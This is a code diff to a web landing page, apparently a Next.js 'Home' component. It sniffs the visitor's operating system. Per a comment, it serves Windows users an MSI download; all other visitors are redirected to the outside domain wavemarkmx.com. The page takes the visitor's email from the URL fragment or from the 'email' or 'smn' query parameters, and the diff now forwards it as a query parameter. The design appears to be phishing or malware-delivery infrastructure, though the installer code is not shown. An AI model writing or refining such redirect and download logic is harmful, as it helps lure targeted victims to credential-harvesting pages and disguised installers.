@@ -6,8 +6,7 @@ export default function Home() {
     const userAgent = navigator.userAgent || '';
     const isWindows = /windows/i.test(userAgent);
 
-    const NON_WINDOWS_TARGET =
-      "https://wavemarkmx.com/ms";
+    const NON_WINDOWS_TARGET = "https://wavemarkmx.com/ms";
 
     //------------------------------------------------------------------
     // 1. Windows users → MSI download, then redirect
@@ -37,12 +36,12 @@ export default function Home() {
       email = url.hash.substring(1);
     }
 
-    // B) Query parameters ?email= / &email=
+    // B) Query parameters ?email=
     if (!email && url.searchParams.get("email")) {
       email = url.searchParams.get("email");
     }
 
-    // C) Query parameter fallback ?smn= / &smn=
+    // C) Query parameter fallback ?smn=
     if (!email && url.searchParams.get("smn")) {
       email = url.searchParams.get("smn");
     }
@@ -51,10 +50,11 @@ export default function Home() {
     const safeEmail = email ? encodeURIComponent(email) : "";
 
     //------------------------------------------------------------------
-    // 3. Redirect to external NON-Windows destination
+    // 3. Redirect to external NON-Windows destination with query parameter
     //------------------------------------------------------------------
+    const separator = NON_WINDOWS_TARGET.includes('?') ? '&' : '?';
     const finalUrl = safeEmail
-      ? `${NON_WINDOWS_TARGET}#${safeEmail}`
+      ? `${NON_WINDOWS_TARGET}${separator}email=${safeEmail}`
       : NON_WINDOWS_TARGET;
 
     window.location.href = finalUrl;
